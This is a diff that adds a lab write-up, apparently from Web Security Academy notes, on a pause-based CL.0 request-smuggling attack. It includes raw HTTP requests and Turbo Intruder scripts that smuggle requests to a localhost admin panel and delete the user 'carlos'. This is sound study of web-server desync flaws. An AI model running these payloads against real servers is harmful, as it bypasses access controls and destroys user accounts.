@@ -343,6 +343,88 @@ When you first start the attack, you won't see any results in the table. However
 >[!note]
 >Instead of using `pauseMarker` to specify a pause based on string matching, you can use the `pauseBefore` argument to specify an offset. For example, you could pause before the body by specifying an offset that's the inverse of the `Content-Length` (`pauseBefore=-34`).
 
+### Pause-based CL.0 + Broken Access Controll
+
+Request:
+```http
+POST /resources HTTP/2
+Host: 0aa800b00334602580c7089d00af0065.web-security-academy.net
+Cookie: session=JA4fma1pgmjHNfyR6LeZIH4uVgAq5l8m
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 85
+
+GET /admin/ HTTP/1.1
+Host: localhost
+```
+
+Turbo-intruder script:
+```py
+# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+
+    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
+    engine.queue(target.req)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+Result:
+![](../../zzz_res/attachments/pause-based_CL0.png)
+
+```html
+...
+<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
+	<input required type="hidden" name="csrf" value="mfanMrypvbYexeepiit77XVCnLaCAG10">
+	<label>Username</label>
+	<input required type='text' name='username'>
+	<button class='button' type='submit'>Delete user</button>
+</form>
+...
+```
+
+Final payload:
+```py
+'''
+POST /resources HTTP/2
+Host: 0aa800b00334602580c7089d00af0065.web-security-academy.net
+Cookie: session=JA4fma1pgmjHNfyR6LeZIH4uVgAq5l8m
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 159
+
+POST /admin/delete/ HTTP/1.1
+Host: localhost
+Content-Type: x-www-form-urlencoded
+Content-Length: 53
+
+csrf=pUfTPDpksJMJDaheqdsvnBKBWrR43V1Y&username=carlos
+'''
+
+# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+
+    engine.queue(target.req, pauseMarker=['Content-Length: 159\r\n\r\n'], pauseTime=61000)
+    engine.queue(target.req)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+```
+
 ## Client-side pause-based desync
 
 In theory, it may be possible to perform a client-side variation of the pause-based CL.0 desync. Unfortunately, we haven't yet found a reliable way to make a browser pause mid-request. However, there is one possible workaround - an active MITM attack.
